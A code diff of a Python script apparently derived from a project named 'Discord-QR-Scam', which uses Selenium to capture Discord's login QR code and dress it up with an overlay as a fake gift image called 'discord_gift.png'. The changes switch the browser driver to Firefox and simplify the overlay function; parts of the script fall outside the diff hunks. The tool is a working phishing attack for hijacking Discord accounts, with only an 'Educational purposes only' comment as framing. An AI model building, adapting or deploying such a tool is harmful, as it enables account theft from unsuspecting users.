@@ -1,13 +1,12 @@
 from bs4 import BeautifulSoup
 from selenium import webdriver
-from selenium.webdriver.chrome.service import Service
 from PIL import Image
 from pathlib import Path
 import base64
 import time
 
 # Developers: NightfallGT and MegaWatt_
-# source: https://github.com/NightfallGT/Discord-QR-Scam
+# broken source: https://github.com/NightfallGT/Discord-QR-Scam
 # Educational purposes only
 
 class Colors:
@@ -15,14 +14,11 @@ class Colors:
     WHITE = '\033[0m'
     GREEN = '\033[92m'
 
-print(Colors.GREEN + "Если у вас не Windows, скачать драйвер можно тут: https://chromedriver.storage.googleapis.com/index.html?path=107.0.5304.62/" + Colors.WHITE)
 path = Path(__file__).parent
 
-def logo_qr(overlay=True, filename="overlay.png"):
-    if not overlay:
-        return
+def logo_qr():
     im1 = Image.open(path.joinpath("temp", "qr_code.png"), 'r')
-    im2 = Image.open(path.joinpath("temp", filename), 'r')
+    im2 = Image.open(path.joinpath("temp", "overlay.png"), 'r')
     im1.paste(im2, (60, 55), mask=im2)
     im1.save(path.joinpath("temp", "final_qr.png"), quality=95)
 
@@ -34,17 +30,13 @@ def final_form():
     im1.show()
 
 def main():
-    s = Service(path.joinpath("chromedriver.exe"))
-    options = webdriver.ChromeOptions()
-    options.add_experimental_option('excludeSwitches', ['enable-logging'])
-    options.add_experimental_option('detach', True)
     try:
-        driver = webdriver.Chrome(service=s, options=options)
+        driver = webdriver.Firefox(executable_path="geckodriver")
     except Exception as e:
         try:
             e.stacktrace = None
         except AttributeError:
-            pass
+            ...
         print(Colors.RED + "ERROR: " + Colors.WHITE, end="")
         print(e)
         exit()
@@ -67,7 +59,7 @@ def main():
         handler.write(img_data)
 
     discord_login = driver.current_url
-    logo_qr(overlay=False)
+    logo_qr()
     final_form()
 
     print('- QR Code has been generated. > discord_gift.png')
